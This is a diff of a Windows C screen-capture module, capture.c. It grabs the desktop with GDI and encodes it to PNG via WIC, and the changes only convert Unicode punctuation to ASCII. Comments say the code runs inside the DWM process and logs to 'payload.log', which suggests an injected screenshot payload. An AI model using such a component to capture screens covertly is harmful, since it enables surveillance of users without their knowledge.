@@ -1,11 +1,11 @@
 /* ================================================================== *
- * capture.c — GDI screen capture + WIC PNG encoding.                  *
+ * capture.c -- GDI screen capture + WIC PNG encoding.                  *
  *                                                                    *
  * Pipeline:                                                          *
- *   1. GetDC(NULL) — desktop DC                                      *
+ *   1. GetDC(NULL) -- desktop DC                                      *
  *   2. CreateCompatibleBitmap + BitBlt(SRCCOPY)                      *
- *   3. GetDIBits → BGRA buffer                                       *
- *   4. WIC IWICBitmap + IWICBitmapEncoder(PNG) → IStream → bytes     *
+ *   3. GetDIBits -> BGRA buffer                                       *
+ *   4. WIC IWICBitmap + IWICBitmapEncoder(PNG) -> IStream -> bytes     *
  * ================================================================== */
 
 #include "../../shared/common.h"
@@ -25,7 +25,7 @@
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "user32.lib")
 
-/* CoInitialize once per DWM lifetime — thread-safe via one-shot guard. */
+/* CoInitialize once per DWM lifetime -- thread-safe via one-shot guard. */
 static volatile LONG g_co_init = 0;
 static void ensure_co(void) {
     if (InterlockedCompareExchange(&g_co_init, 1, 0) == 0) {
@@ -36,7 +36,7 @@ static void ensure_co(void) {
     }
 }
 
-/* WIC GUIDs — declared here to avoid depending on the full uuid.lib. */
+/* WIC GUIDs -- declared here to avoid depending on the full uuid.lib. */
 static const IID IID_IWICImagingFactory2_local = {
     0x7B816B45, 0x1996, 0x4476, {0xB1, 0x32, 0xDE, 0x9E, 0x24, 0x7C, 0x8A, 0xF0}
 };
@@ -62,7 +62,7 @@ typedef struct IWICBitmapEncoder    IWICBitmapEncoder;
 typedef struct IWICBitmapFrameEncode IWICBitmapFrameEncode;
 typedef struct IPropertyBag2        IPropertyBag2;
 
-/* We use the runtime-created interface pointers via COM QueryInterface —
+/* We use the runtime-created interface pointers via COM QueryInterface --
  * no need to redeclare vtable structs since wincodec.h has them all. */
 
 /* Compress a BGRA buffer to PNG bytes via WIC + memory stream. */
@@ -79,7 +79,7 @@ static int bgra_to_png(const uint8_t *bgra, UINT w, UINT h, UINT stride,
         return 0;
     }
 
-    /* Use CreateStreamOnHGlobal — SHCreateMemStream is NOT HGLOBAL-backed
+    /* Use CreateStreamOnHGlobal -- SHCreateMemStream is NOT HGLOBAL-backed
      * (confirmed 2026-07-05: caused GetHGlobalFromStream to return
      * E_INVALIDARG in DWM's process context). */
     IStream *stream = NULL;
@@ -200,7 +200,7 @@ int cap_primary_png(uint8_t **out_png, size_t *out_len) {
     ReleaseDC(NULL, screen_dc);
 
     if (ok) {
-        slog_writef("payload.log", "cap: %dx%d → %zu png bytes", w, h, *out_len);
+        slog_writef("payload.log", "cap: %dx%d -> %zu png bytes", w, h, *out_len);
     } else {
         slog_writef("payload.log", "cap: PNG encode failed");
     }
